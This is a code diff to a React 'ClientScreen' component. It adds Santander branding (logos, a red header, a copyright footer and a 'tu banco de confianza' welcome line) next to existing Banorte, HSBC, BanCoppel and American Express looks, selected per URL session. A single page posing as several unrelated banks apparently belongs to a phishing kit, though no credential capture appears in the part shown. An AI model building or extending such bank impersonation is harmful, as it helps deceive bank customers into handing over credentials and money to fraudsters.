@@ -16,6 +16,8 @@ import banorteLogoFooter from '@assets/Banorte-01.png';
 import hsbcLogo from '@assets/Hsbc.png';
 import hsbcBackground from '@assets/IMG_0391.jpeg';
 import amexLogo from '@assets/Amex.png';
+import santanderLogo from '../assets/santander_logo.png';
+import santanderLogoWhite from '../assets/santander_logo_white.png';
 
 export default function ClientScreen() {
   // Get session ID from URL
@@ -189,6 +191,19 @@ export default function ClientScreen() {
           />
         </header>
       );
+    } else if (sessionData.banco === 'SANTANDER') {
+      return (
+        <header className="santander-header">
+          <div className="flex flex-col items-center justify-center">
+            <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
+            <img 
+              src={santanderLogoWhite} 
+              className="h-20 inline-block" 
+              alt="Santander" 
+            />
+          </div>
+        </header>
+      );
     } else {
       // Default header (Banorte)
       return (
@@ -267,6 +282,7 @@ export default function ClientScreen() {
             sessionData.banco === 'BANCOPPEL' ? 'bg-[#0066B3]' :
             sessionData.banco === 'HSBC' ? 'bg-[#DB0011]' :
             sessionData.banco === 'AMEX' ? 'bg-[#0077C8]' :
+            sessionData.banco === 'SANTANDER' ? 'bg-[#EC0000]' :
             'bg-[#EC1C24]'
           } text-white p-4 text-center text-sm`}>
             <div className="mb-3">
@@ -282,6 +298,7 @@ export default function ClientScreen() {
               sessionData.banco === 'BANCOPPEL' ? 'BanCoppel' :
               sessionData.banco === 'HSBC' ? 'HSBC' :
               sessionData.banco === 'AMEX' ? 'American Express' :
+              sessionData.banco === 'SANTANDER' ? 'Santander' :
               'Banorte'
             } México 2024. Todos los Derechos Reservados</div>
           </div>
@@ -328,6 +345,12 @@ export default function ClientScreen() {
       return (
         <div className="text-center mt-2 px-4">
           <p className="text-sm text-gray-600 mt-1">Bienvenido a American Express</p>
+        </div>
+      );
+    } else if (sessionData.banco === 'SANTANDER') {
+      return (
+        <div className="text-center mt-2 px-4">
+          <p className="text-sm text-gray-600 mt-1">Bienvenido a Santander, tu banco de confianza</p>
         </div>
       );
     } else {
